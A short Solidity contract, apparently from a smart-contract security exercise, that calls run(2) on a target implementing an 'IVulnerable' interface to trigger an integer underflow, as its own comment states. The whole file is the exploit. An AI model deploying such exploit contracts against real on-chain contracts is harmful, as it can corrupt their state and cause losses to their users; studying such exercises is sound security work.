pragma solidity ^0.4.19;

interface IVulnerable {
    function run(uint256 input) external;
    function count() external view returns (uint256);
}

contract ExploitUnderflow {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack() public {
        // Exploit: cause underflow by subtracting 2 from 1
        IVulnerable(target).run(2);
    }

    function getCount() public view returns (uint256) {
        return IVulnerable(target).count();
    }
}

